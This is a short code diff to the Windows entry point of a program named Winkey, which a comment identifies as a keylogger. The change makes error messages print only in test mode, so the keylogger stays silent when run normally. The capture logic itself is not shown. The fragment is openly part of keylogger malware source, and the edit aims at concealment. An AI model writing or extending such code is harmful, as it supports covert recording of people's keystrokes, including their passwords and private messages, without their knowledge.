@@ -19,15 +19,19 @@ static bool isTestModeSet(int argc, wchar_t *argv[]) {
 
 int wmain(int argc, wchar_t *argv[]) {
     Winkey *w = new Winkey();
+    bool    isTestMode = isTestModeSet(argc, argv);
 
     try {
         // Run the keylogger
-        w->run(isTestModeSet(argc, argv));
+        w->run(isTestMode);
     }
     catch (const WinkeyException &e)
     {
-        std::cerr << "Error (" << static_cast<int>(e.code()) << "): "
-                  << e.what() << std::endl;
+        if (isTestMode) { // Output errors only while testing
+            std::cerr << "Error (" << static_cast<int>(e.code()) << "): "
+                      << e.what() << std::endl;
+        }
+
         delete w;
         return 1;
     }
